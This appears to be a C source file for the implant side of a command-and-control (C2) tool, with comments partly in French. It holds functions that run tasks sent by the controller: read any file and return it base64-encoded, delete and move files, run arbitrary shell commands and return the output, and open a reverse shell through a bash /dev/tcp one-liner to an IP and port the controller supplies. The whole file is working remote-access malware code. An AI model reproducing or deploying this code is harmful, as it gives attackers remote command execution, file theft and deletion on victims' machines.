//
// Created by melo on 4/8/25.
//

#include "tasks.h"
#include "base64.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stddef.h>

char * sleep_task(char * buffer_fetch, char * dest_result) {
    /*
    Tache qui coupe le programme pendant X secondes sur demande du C2
    format de l'entrée : SLEEP,e2f6421cfa,MQ==,MA==
    format de la sortie : e2f6421cfa : ID de la tache
    modifie dest_result : contient vide pour sleep
    */
    char buffer[1024];
    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original string

    char * commande = strtok(buffer, ",");
    if (strcmp(commande, "SLEEP") != 0) {
        printf("Invalid command\n");
        return NULL;
    }

    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID

    char * timer_string = strtok(NULL, ",");
    char * decoded_timer = NULL;
    decoder_base64(timer_string, &decoded_timer);
    int timer = atoi(decoded_timer);
    free(decoded_timer);

    char * random_string = strtok(NULL, ",");
    char * decoded_random = NULL;
    decoder_base64(random_string, &decoded_random);
    int random = atoi(decoded_random);
    free(decoded_random);

    // Initialize random seed
    srand(time(NULL));
    printf("random: %d\n", random);
    printf("timer: %d\n", timer);

    int sleep_time;
    if (random > 0) {
        sleep_time = timer - random + rand() % (2 * random + 1);
    } else {
        sleep_time = timer;
    }

    if (sleep_time < 0) {
        sleep_time = 0;
    }

    printf("Sleeping for %d seconds\n", sleep_time);
    sleep(sleep_time);

    // No result for sleep task
    dest_result[0] = '\0';

    return task_ID_copy;
}

char * cat_task(char * buffer_fetch, char * dest) {
    /*
    Tache qui affiche le contenu d'un fichier sur demande du C2
    format de l'entrée : CAT,847532c65b,Li90ZXN0  dest est vide
    format de la sortie : e2f6421cfa : ID de la tache
    modifie dest : contient la base 64 du fichier
    */
    char buffer[1024];
    strcpy(buffer, buffer_fetch);

    char * command = strtok(buffer, ",");
    if (strcmp(command, "CAT") != 0) {
        printf("Invalid command\n");
        return NULL;
    }

    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID

    char * file_path = strtok(NULL, ",");
    if (file_path == NULL) {
        printf("Missing file path\n");
        free(task_ID_copy);
        return NULL;
    }

    char * decoded_file_path = NULL;
    decoder_base64(file_path, &decoded_file_path);
    if (decoded_file_path == NULL) {
        printf("Failed to decode file path\n");
        free(task_ID_copy);
        return NULL;
    }

    FILE *file = fopen(decoded_file_path, "r");
    if (file == NULL) {
        perror("Error opening file");
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Read file content
    char *file_content = malloc(file_size + 1);
    if (file_content == NULL) {
        perror("Memory allocation failed");
        fclose(file);
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }

    size_t read_size = fread(file_content, 1, file_size, file);
    file_content[read_size] = '\0';
    fclose(file);

    // Encode file content to base64
    char *encoded_content = NULL;
    encoder_base64(file_content, &encoded_content);
    if (encoded_content == NULL) {
        printf("Failed to encode file content\n");
        free(file_content);
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }

    // Copy the encoded content to dest
    strcpy(dest, encoded_content);

    // Clean up
    free(file_content);
    free(encoded_content);
    free(decoded_file_path);

    return task_ID_copy;
}


char * rm_task(char * buffer_fetch) {
    /*
    Tache qui supprime un fichier sur demande du C2
    format de l'entrée : RM,3f5c2fd1d3,L2hvbWUvbWVsby9tYWluLmM=
    */

    char buffer[1024];
    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original string

    char * command = strtok(buffer, ",");
    if (strcmp(command, "RM") != 0) {
        printf("Invalid command\n");
        return NULL;
    }

    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID

    char * file_path = strtok(NULL, ",");
    if (file_path == NULL) {
        printf("Missing file path\n");
        free(task_ID_copy);
        return NULL;
    }

    char * decoded_file_path = NULL;
    decoder_base64(file_path, &decoded_file_path);
    if (decoded_file_path == NULL) {
        printf("Failed to decode file path\n");
        free(task_ID_copy);
        return NULL;
    }

    if (remove(decoded_file_path) == 0) {
        printf("File %s deleted successfully\n", decoded_file_path);
    } else {
        perror("Error deleting file");
    }

    free(decoded_file_path);
    return task_ID_copy;
}

char * mv_task(char * buffer_fetch) {
    /*
    Tache qui déplace un fichier sur demande du C2
    format de l'entrée : MV,3f5c2fd1d3,L2hvbWUvbWVsby9tYWluLmM=,L2hvbWUvbWVsby9tYWluXzE=
    */
  char buffer[1024];
    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original string
    char * command = strtok(buffer, ",");
    if (strcmp(command, "MV") != 0) {
        printf("Invalid command\n");
        return NULL;
    }
    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID
    char * file_path = strtok(NULL, ",");
    if (file_path == NULL) {
        printf("Missing file path\n");
        free(task_ID_copy);
        return NULL;
    }
    char * decoded_file_path = NULL;
    decoder_base64(file_path, &decoded_file_path);
    if (decoded_file_path == NULL) {
        printf("Failed to decode file path\n");
        free(task_ID_copy);
        return NULL;
    }
    char * new_file_path = strtok(NULL, ",");
    if (new_file_path == NULL) {
        printf("Missing new file path\n");
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }
    char * decoded_new_file_path = NULL;
    decoder_base64(new_file_path, &decoded_new_file_path);
    if (decoded_new_file_path == NULL) {
        printf("Failed to decode new file path\n");
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }
    if (rename(decoded_file_path, decoded_new_file_path) == 0) {
        printf("File %s moved to %s successfully\n", decoded_file_path, decoded_new_file_path);
    } else {
        perror("Error moving file");
    }
    free(decoded_file_path);
    free(decoded_new_file_path);
    return task_ID_copy;
}

// Implementation for execve_task - Execute a command
char * execve_task(char * buffer_fetch, char * dest) {
    /*
    Task that executes a command on demand from the C2
    Input format: EXECVE,task_ID,encoded_command,encoded_args
    Output format: result in dest containing base64 encoded command output
    */
    char buffer[1024];
    strcpy(buffer, buffer_fetch);

    char * command = strtok(buffer, ",");
    if (strcmp(command, "EXECVE") != 0) {
        printf("Invalid command\n");
        return NULL;
    }

    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID

    char * encoded_cmd = strtok(NULL, ",");
    if (encoded_cmd == NULL) {
        printf("Missing command\n");
        free(task_ID_copy);
        return NULL;
    }

    char * encoded_args = strtok(NULL, ",");
    if (encoded_args == NULL) {
        printf("Missing arguments\n");
        free(task_ID_copy);
        return NULL;
    }

    // Decode command and arguments
    char * cmd = NULL;
    char * args = NULL;
    decoder_base64(encoded_cmd, &cmd);
    decoder_base64(encoded_args, &args);

    // Create full command
    char full_command[2048];
    snprintf(full_command, sizeof(full_command), "%s %s", cmd, args);
    printf("Executing: %s\n", full_command);

    // Execute the command and capture output
    FILE *fp = popen(full_command, "r");
    if (fp == NULL) {
        perror("Failed to execute command");
        free(cmd);
        free(args);
        free(task_ID_copy);
        return NULL;
    }

    // Read command output
    char output[1024*1024] = {0};
    char buffer_read[1024];
    while (fgets(buffer_read, sizeof(buffer_read), fp) != NULL) {
        strcat(output, buffer_read);
    }
    pclose(fp);

    // Encode result to base64
    char * encoded_output = NULL;
    encoder_base64(output, &encoded_output);

    // Copy encoded output to destination
    strcpy(dest, encoded_output);

    // Clean up
    free(cmd);
    free(args);
    free(encoded_output);

    return task_ID_copy;
}

char * revshell_task(char * buffer_fetch, char * dest) {
    /*
    Task that opens a reverse shell to a specified IP and port
    Input format: REVSHELL,task_ID,encoded_port,encoded_ip
    Output: No output is expected as this creates a new connection
    */
    char buffer[1024];
    strcpy(buffer, buffer_fetch);

    char * command = strtok(buffer, ",");
    if (strcmp(command, "REVSHELL") != 0) {
        printf("Invalid command\n");
        return NULL;
    }

    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID

    char * encoded_port = strtok(NULL, ",");
    if (encoded_port == NULL) {
        printf("Missing port\n");
        free(task_ID_copy);
        return NULL;
    }

    char * encoded_ip = strtok(NULL, ",");
    if (encoded_ip == NULL) {
        printf("Missing IP\n");
        free(task_ID_copy);
        return NULL;
    }

    // Decode port and IP
    char * port = NULL;
    char * ip = NULL;
    decoder_base64(encoded_port, &port);
    decoder_base64(encoded_ip, &ip);

    // Create the reverse shell command
    char shell_command[1024];
    snprintf(shell_command, sizeof(shell_command),
             "bash -c 'sh -i >& /dev/tcp/%s/%s 0>&1'",
             ip, port);

    printf("Launching reverse shell to %s:%s\n", ip, port);

    // Execute the reverse shell command in the background
    // We use system() instead of popen() because we don't need to capture output
    char background_cmd[1100];
    snprintf(background_cmd, sizeof(background_cmd), "%s &", shell_command);
    system(background_cmd);

    // No output is expected for reverse shell
    dest[0] = '\0';

    // Clean up
    free(port);
    free(ip);

    return task_ID_copy;
}